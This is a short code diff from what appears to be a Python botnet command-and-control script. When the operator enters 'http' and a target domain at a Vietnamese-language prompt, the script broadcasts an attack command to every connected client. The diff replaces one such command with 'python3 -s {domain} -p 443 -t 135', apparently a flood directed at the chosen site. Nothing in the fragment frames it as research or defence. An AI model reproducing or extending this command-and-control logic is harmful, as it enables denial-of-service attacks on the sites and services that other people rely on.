@@ -73,7 +73,7 @@ while True:
                
             if cmd == "http":
                 domain = input("Nhập tên miền: ")
-                control = f"./getblaze --hostname https://{domain}"
+                control = f"python3 -s {domain} -p 443 -t 135"
                 control = control.encode()
                 for conn in list_hostname:
                     conn.sendall(control)
